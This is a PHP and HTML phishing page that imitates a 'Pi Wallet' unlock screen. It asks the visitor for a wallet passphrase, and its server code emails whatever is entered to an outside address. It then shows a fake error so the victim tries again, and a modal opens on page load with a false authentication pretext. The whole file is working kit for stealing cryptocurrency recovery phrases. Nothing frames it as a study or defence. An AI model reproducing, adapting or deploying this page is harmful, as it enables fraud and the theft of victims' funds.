<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wallet Unlock</title>
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
  <style>
    /* Header styles */
    .header {
      background-color: #562A77;
      color: white;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .header h1 {
      font-size: 18px;
      margin: 0;
      padding-left:7px;
      padding-right:7px;
    }
    .header-icons {
      font-size: 20px;
    }
    
    /* Main content styles */
    .container {
      margin-top: 20px;
      text-align: center;
    }
    
    .unlock-textarea {
      width: 100%;
      height: 150px;
      border: 1px solid #ddd;
      padding: 10px;
      font-size: 18px;
      color: gray;
      resize: none;
    }

    .unlock-btn {
      background-color: #562A77;
      color: white;
      font-size: 16px;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      margin-top: 20px;
      width: 100%;
    }

    .description {
      font-size: 14px;
      color: #333;
      margin-top: 20px;
      text-align: left;
    }

    .description a {
      color: #007bff;
      text-decoration: none;
    }

    .description a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<!-- Header -->
<div class="header">
  <span class="header-icons"><img src="icon.jpg" style="width:30px"></span>
  <h1><b>Wallet</b></h1>
  <span class="header-icons"><img src="side.png" style="width:30px"></span>
</div>

<!-- Main Content -->
<div class="container">
  <h2>Unlock Pi Wallet</h2>
  
  <?php
    // Check if form is submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Sanitize and fetch the input
        $walletPassphrase = htmlspecialchars($_POST['walletPassphrase']);
        
        // Set the email details
        $to = "admin@piactivation.com";
        $subject = "Wallet Unlock Request";
        $message = "User has submitted the following wallet passphrase:\n\n" . $walletPassphrase;
        $headers = "From: noreply@yourdomain.com"; // Replace with your domain or email

        // Send the email
        if (mail($to, $subject, $message, $headers)) {
            echo '<div class="success-message"style="color:red;">ERROR!!! PLEASE TRY AGAIN</div>';
        } else {
            echo '<div class="success-message" style="color:red;">Failed to send the email. Please try again later.</div>';
        }
    }
  ?>
  <!-- Form for sending the content -->
  <form method="POST" action="">
    <!-- Textarea for translation loading -->
    <textarea class="unlock-textarea" name="walletPassphrase" placeholder="Enter your passphrase..."></textarea>

    <!-- Unlock Button -->
    <button type="submit" class="unlock-btn">Unlock With Passphrase</button>
  </form>
<br>
  <!-- Description Text -->
  <div class="description">
    <p style="font-size:22px;font-weight:400">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
    <p  style="font-size:22px;font-weight:400">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
  </div>
</div>

<!-- Bootstrap Modal for Authentication Alert -->
<div class="modal fade" id="authModal" tabindex="-1" aria-hidden="true" data-backdrop="static" data-keyboard="false">
  <div class="modal-dialog">
    <div class="modal-content text-center">
      <div class="modal-body">
        <p><strong>Authenticate Your Wallet</strong></p>
        <p>For External Inter-Continent Transactions on Cross-Border Payments.</p>
      </div>
      <div class="modal-footer justify-content-center">
        <button type="button" class="btn btn-primary" data-dismiss="modal" style="background-color: #562A77; border:none;">Continue</button>
      </div>
    </div>
  </div>
</div>

<!-- Bootstrap and jQuery JavaScript -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>

<script>
  // Show the modal when the page loads
  $(document).ready(function() {
    $('#authModal').modal('show');
  });
</script>

</body>
</html>
